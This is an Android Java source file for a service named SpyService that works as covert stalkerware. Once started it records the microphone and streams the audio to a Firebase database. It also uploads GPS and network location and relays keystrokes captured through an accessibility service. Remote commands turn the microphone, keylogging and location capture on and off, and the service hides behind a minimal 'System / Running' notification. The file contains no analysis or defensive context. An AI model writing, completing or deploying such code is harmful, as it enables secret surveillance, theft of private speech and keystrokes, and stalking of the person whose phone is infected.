package com.system.phantom;

import android.app.*;
import android.content.*;
import android.location.*;
import android.media.*;
import android.os.*;
import android.provider.Settings;
import android.util.Base64;
import com.google.firebase.database.*;
import java.util.*;

public class SpyService extends Service {
    private AudioRecord audioRecord;
    private boolean isRecording = false;
    private Thread audioThread;
    private DatabaseReference dbRef;
    private String deviceId;
    private boolean keylogEnabled = false;
    private LocationManager locationManager;
    private LocationListener locationListener;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Lock");
        wl.acquire(10 * 60 * 1000L);
        startForeground(9999, createNotif());

        dbRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId);
        Map<String, Object> status = new HashMap<>();
        status.put("model", Build.MODEL);
        status.put("online", true);
        status.put("mic", false);
        status.put("keylog", false);
        dbRef.updateChildren(status);

        dbRef.child("command").addValueEventListener(new ValueEventListener() {
            @Override public void onDataChange(DataSnapshot s) {
                String cmd = s.getValue(String.class);
                if (cmd != null) handleCmd(cmd);
            }
            @Override public void onCancelled(DatabaseError e) {}
        });

        SpyAccessibilityService.setSpyService(this);
        startAudio();
        startLocationUpdates();
    }

    private void handleCmd(String cmd) {
        if (cmd.equals("MIC_START") && !isRecording) {
            startAudio();
            dbRef.child("mic").setValue(true);
        } else if (cmd.equals("MIC_STOP") && isRecording) {
            stopAudio();
            dbRef.child("mic").setValue(false);
        } else if (cmd.equals("KEYLOG_START")) {
            keylogEnabled = true;
            dbRef.child("keylog").setValue(true);
        } else if (cmd.equals("KEYLOG_STOP")) {
            keylogEnabled = false;
            dbRef.child("keylog").setValue(false);
        } else if (cmd.equals("LOCATION")) {
            requestLocationNow();
        }
    }

    public void sendKeylog(String text) {
        if (keylogEnabled && dbRef != null) {
            dbRef.child("keylog_data").push().setValue(text);
        }
    }

    private void startAudio() {
        if (isRecording) return;
        int bs = AudioRecord.getMinBufferSize(8000, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, 8000,
                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bs * 2);
        isRecording = true;
        audioThread = new Thread(() -> {
            byte[] buf = new byte[bs];
            while (isRecording) {
                int r = audioRecord.read(buf, 0, buf.length);
                if (r > 0 && dbRef != null) {
                    dbRef.child("audio").setValue(Base64.encodeToString(buf, 0, r, Base64.NO_WRAP));
                }
                try { Thread.sleep(50); } catch (Exception e) {}
            }
        });
        audioRecord.startRecording();
        audioThread.start();
    }

    private void stopAudio() {
        isRecording = false;
        if (audioThread != null) audioThread.interrupt();
        if (audioRecord != null) {
            audioRecord.stop();
            audioRecord.release();
        }
    }

    private void startLocationUpdates() {
        if (locationManager == null) {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        }
        if (locationListener == null) {
            locationListener = new LocationListener() {
                @Override public void onLocationChanged(Location loc) {
                    if (dbRef != null) {
                        Map<String, Object> l = new HashMap<>();
                        l.put("lat", loc.getLatitude());
                        l.put("lng", loc.getLongitude());
                        l.put("accuracy", loc.getAccuracy());
                        l.put("time", System.currentTimeMillis());
                        dbRef.child("location").setValue(l);
                    }
                }
                @Override public void onStatusChanged(String p, int s, Bundle b) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onProviderDisabled(String p) {}
            };
        }
        try {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000, 10, locationListener);
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 10000, 10, locationListener);
        } catch (SecurityException e) { e.printStackTrace(); }
    }

    private void stopLocationUpdates() {
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
    }

    private void requestLocationNow() {
        if (locationManager == null) return;
        try {
            Location last = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (last == null) last = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (last != null && dbRef != null) {
                Map<String, Object> l = new HashMap<>();
                l.put("lat", last.getLatitude());
                l.put("lng", last.getLongitude());
                l.put("accuracy", last.getAccuracy());
                l.put("time", System.currentTimeMillis());
                dbRef.child("location").setValue(l);
            }
        } catch (SecurityException e) {}
    }

    private Notification createNotif() {
        String ch = "phantom_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_LOW);
            c.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(c);
        }
        return new Notification.Builder(this, ch)
                .setContentTitle("System")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN)
                .setVisibility(Notification.VISIBILITY_SECRET)
                .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopAudio();
        stopLocationUpdates();
        if (dbRef != null) dbRef.child("online").setValue(false);
    }

    @Override public IBinder onBind(Intent i) { return null; }
}